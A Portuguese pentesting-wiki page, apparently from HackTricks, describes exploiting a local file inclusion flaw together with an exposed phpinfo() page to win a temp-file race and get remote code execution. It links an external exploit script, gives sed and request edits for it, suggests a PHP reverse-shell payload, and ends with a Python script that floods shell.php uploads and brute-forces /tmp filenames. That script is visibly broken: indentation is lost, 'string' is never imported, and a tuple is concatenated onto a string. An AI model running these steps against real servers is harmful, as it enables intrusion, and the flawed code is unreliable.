{{#include ../../banners/hacktricks-training.md}}

Para explorar essa vulnerabilidade, você precisa: **Uma vulnerabilidade LFI, uma página onde phpinfo() é exibido, "file_uploads = on" e o servidor deve ser capaz de escrever no diretório "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

Você precisa corrigir o exploit (mudar **=>** para **=>**). Para fazer isso, você pode fazer:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Você também precisa alterar o **payload** no início do exploit (por exemplo, para um php-rev-shell), o **REQ1** (isso deve apontar para a página phpinfo e deve ter o padding incluído, ou seja: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), e **LFIREQ** (isso deve apontar para a vulnerabilidade LFI, ou seja: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Verifique o duplo "%" ao explorar o caractere nulo)

{{#file}}
LFI-With-PHPInfo-Assistance.pdf
{{#endfile}}

### Teoria

Se uploads são permitidos em PHP e você tenta fazer o upload de um arquivo, esse arquivo é armazenado em um diretório temporário até que o servidor termine de processar a solicitação, então esse arquivo temporário é excluído.

Então, se você encontrou uma vulnerabilidade LFI no servidor web, pode tentar adivinhar o nome do arquivo temporário criado e explorar um RCE acessando o arquivo temporário antes que ele seja excluído.

Em **Windows**, os arquivos geralmente são armazenados em **C:\Windows\temp\php**

Em **linux**, o nome do arquivo costuma ser **aleatório** e localizado em **/tmp**. Como o nome é aleatório, é necessário **extrair de algum lugar o nome do arquivo temporário** e acessá-lo antes que ele seja excluído. Isso pode ser feito lendo o valor da **variável $\_FILES** dentro do conteúdo da função "**phpconfig()**".

**phpinfo()**

**PHP** usa um buffer de **4096B** e quando está **cheio**, é **enviado ao cliente**. Então, o cliente pode **enviar** **muitas requisições grandes** (usando cabeçalhos grandes) **fazendo upload de um php** reverse **shell**, esperar que **a primeira parte do phpinfo() seja retornada** (onde o nome do arquivo temporário está) e tentar **acessar o arquivo temporário** antes que o servidor php exclua o arquivo explorando uma vulnerabilidade LFI.

**Script Python para tentar forçar o nome (se o comprimento = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{{#include ../../banners/hacktricks-training.md}}
